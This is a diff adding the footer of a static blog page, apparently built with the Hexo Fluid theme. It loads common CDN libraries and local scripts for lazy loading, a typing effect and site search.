+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
